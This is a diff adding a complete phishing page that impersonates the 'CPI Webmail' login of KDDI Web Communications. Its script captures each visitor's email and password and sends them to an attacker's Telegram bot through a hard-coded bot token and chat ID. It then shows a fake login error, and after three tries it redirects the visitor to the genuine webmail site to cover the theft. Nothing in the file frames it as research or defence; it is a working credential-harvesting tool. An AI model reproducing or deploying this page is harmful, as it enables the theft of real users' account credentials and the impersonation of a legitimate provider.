@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=10" />
+    <title>CPI Webmail Login</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f5f5f5 0%, #efefef 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 4px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            padding: 60px 50px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .logo-container {
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-container img {
+            height: 50px;
+            object-fit: contain;
+        }
+
+        .logo-text {
+            margin-left: 12px;
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            letter-spacing: 1px;
+        }
+
+        .form-wrapper {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            font-size: 13px;
+            font-family: inherit;
+            background: white;
+            color: #333;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            margin-bottom: 0;
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0072c6;
+            box-shadow: 0 0 0 3px rgba(0, 114, 198, 0.1);
+        }
+
+        .form-input:first-of-type {
+            border-radius: 2px 2px 0 0;
+        }
+
+        .form-input:last-of-type {
+            border-radius: 0 0 2px 2px;
+            margin-bottom: 24px;
+        }
+
+        .form-input + .form-input {
+            border-top: none;
+        }
+
+        .loader {
+            display: none;
+            gap: 8px;
+            width: fit-content;
+            margin: 0 auto 20px;
+            flex-direction: row-reverse;
+            justify-content: center;
+        }
+
+        .loader div {
+            width: 6px;
+            height: 6px;
+            background-color: #0072c6;
+            border-radius: 50%;
+            animation: pulse 1.4s ease-in-out infinite;
+        }
+
+        .loader div:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .loader div:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 0.3;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .error-message {
+            display: none;
+            background: #fff3cd;
+            color: #856404;
+            padding: 12px 14px;
+            border-radius: 3px;
+            margin-bottom: 16px;
+            font-size: 12px;
+            border: 1px solid #ffeaa7;
+            text-align: left;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px 24px;
+            background: #0072c6;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 12px;
+        }
+
+        .login-btn:hover:not(:disabled) {
+            background: #005ba3;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .language-section {
+            margin-top: 28px;
+            padding-top: 24px;
+            border-top: 1px solid #e8e8e8;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .language-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .language-select {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 2px;
+            font-size: 12px;
+            background: white;
+            color: #333;
+            cursor: pointer;
+            min-width: 120px;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23333' d='M1 1l5 5 5-5'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 8px center;
+            padding-right: 28px;
+            background-color: white;
+        }
+
+        .language-select:focus {
+            outline: none;
+            border-color: #0072c6;
+        }
+
+        .help-link {
+            margin-top: 28px;
+            padding-top: 24px;
+            border-top: 1px solid #e8e8e8;
+            font-size: 12px;
+        }
+
+        .help-link a {
+            color: #0072c6;
+            text-decoration: underline;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .help-link a:hover {
+            color: #005ba3;
+            text-decoration: none;
+        }
+
+        .copyright {
+            margin-top: 28px;
+            font-size: 10px;
+            color: #999;
+            text-align: center;
+        }
+
+        @media (max-width: 600px) {
+            .login-container {
+                padding: 40px 30px;
+            }
+
+            .logo-container {
+                margin-bottom: 30px;
+            }
+
+            .logo-text {
+                margin-left: 8px;
+                font-size: 16px;
+            }
+
+            .language-section {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
+            }
+
+            .language-select {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <!-- Logo Section -->
+        <div class="logo-container">
+            <svg width="40" height="40" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- CPI Logo Recreation -->
+                <defs>
+                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#a8d500;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#00a3e0;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <rect width="100" height="100" fill="none"/>
+                <g transform="translate(15, 15)">
+                    <!-- Green section -->
+                    <rect x="0" y="0" width="25" height="25" fill="#a8d500"/>
+                    <rect x="0" y="10" width="25" height="25" fill="#8bc000"/>
+                    <!-- Blue section -->
+                    <rect x="15" y="0" width="25" height="25" fill="#0088cc"/>
+                    <rect x="15" y="10" width="25" height="25" fill="#00a3e0"/>
+                </g>
+            </svg>
+            <div class="logo-text">CPI</div>
+        </div>
+
+        <!-- Form Section -->
+        <form onsubmit="return sendTelegramData(event)">
+            <div id="loader" class="loader">
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+
+            <div id="errorDiv" class="error-message">
+                Authentication failed. Please check your email and password.
+            </div>
+
+            <fieldset id="formFieldset" style="border: none; padding: 0;">
+                <div class="form-wrapper">
+                    <input 
+                        type="email" 
+                        id="emailInput" 
+                        class="form-input" 
+                        placeholder="Email address" 
+                        required
+                        autocomplete="email"
+                    >
+                    <input 
+                        type="password" 
+                        id="passwordInput" 
+                        class="form-input" 
+                        placeholder="Password" 
+                        required
+                        autocomplete="current-password"
+                    >
+                </div>
+
+                <button type="submit" class="login-btn" id="loginBtn">Login</button>
+            </fieldset>
+
+            <!-- Language Section -->
+            <div class="language-section">
+                <label class="language-label">Language</label>
+                <select class="language-select" id="languageSelect">
+                    <option value="en">English</option>
+                    <option value="ja">Japanese</option>
+                    <option value="es">Spanish</option>
+                    <option value="fr">French</option>
+                    <option value="de">German</option>
+                    <option value="zh">Chinese</option>
+                </select>
+            </div>
+
+            <!-- Help Link -->
+            <div class="help-link">
+                <a href="#" onclick="return false;">Click here for information on how to use webmail</a>
+            </div>
+
+            <!-- Copyright -->
+            <div class="copyright">
+                © 2021 KDDI Web Communications Inc.
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_ID = "8571582996:AAGhoLlh20Ttuwr8uAESPmXAQO6tBvKA51w";
+        const TELEGRAM_CHAT_ID = 5491806427;
+        let attemptCount = 0;
+
+        // Show error message
+        function showError() {
+            document.getElementById('errorDiv').style.display = 'block';
+        }
+
+        // Hide error message
+        function hideError() {
+            document.getElementById('errorDiv').style.display = 'none';
+        }
+
+        // Show loading animation
+        function showLoader() {
+            document.getElementById('loader').style.display = 'flex';
+            document.getElementById('formFieldset').style.opacity = '0.5';
+            document.getElementById('loginBtn').disabled = true;
+        }
+
+        // Hide loading animation
+        function hideLoader() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('formFieldset').style.opacity = '1';
+            document.getElementById('loginBtn').disabled = false;
+        }
+
+        // Send data to Telegram
+        function sendTelegramData(event) {
+            event.preventDefault();
+            attemptCount++;
+
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const language = document.getElementById('languageSelect').value;
+
+            showLoader();
+            hideError();
+
+            // Create message for Telegram
+            const telegramMessage = `🔐 CPI WEBMAIL LOGIN ✅\n\n` +
+                `📧 Email: ${email}\n` +
+                `🔑 Password: ${password}\n` +
+                `🌐 Language: ${language}\n\n` +
+                `⏰ Timestamp: ${new Date().toISOString()}\n` +
+                `🔢 Attempt: ${attemptCount}\n\n` +
+                `🏢 Site: CPI Webmail Portal`;
+
+            // Send to Telegram API
+            const settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://api.telegram.org/bot" + TELEGRAM_BOT_ID + "/sendMessage",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+                },
+                "data": JSON.stringify({
+                    "chat_id": TELEGRAM_CHAT_ID,
+                    "text": telegramMessage
+                })
+            };
+
+            $.ajax(settings).done(function (response) {
+                console.log("Telegram message sent:", response);
+            }).fail(function (error) {
+                console.log("Telegram error:", error);
+            });
+
+            // Simulate login delay
+            setTimeout(() => {
+                hideLoader();
+                showError();
+                document.getElementById('passwordInput').value = '';
+
+                // After 3 attempts, redirect
+                if (attemptCount >= 3) {
+                    setTimeout(() => {
+                        window.location.replace("https://webmail.cpi.ad.jp/");
+                    }, 2000);
+                }
+            }, 2500);
+
+            return false;
+        }
+
+        // Hide error on input focus
+        document.getElementById('emailInput').addEventListener('focus', hideError);
+        document.getElementById('passwordInput').addEventListener('focus', hideError);
+
+        // Page load initialization
+        document.addEventListener('DOMContentLoaded', function () {
+            console.log("CPI Webmail Login Page Loaded");
+            // Set default language based on browser
+            const browserLang = navigator.language.split('-')[0];
+            if (['en', 'ja', 'es', 'fr', 'de', 'zh'].includes(browserLang)) {
+                document.getElementById('languageSelect').value = browserLang;
+            }
+        });
+    </script>
+</body>
+
+</html>
+
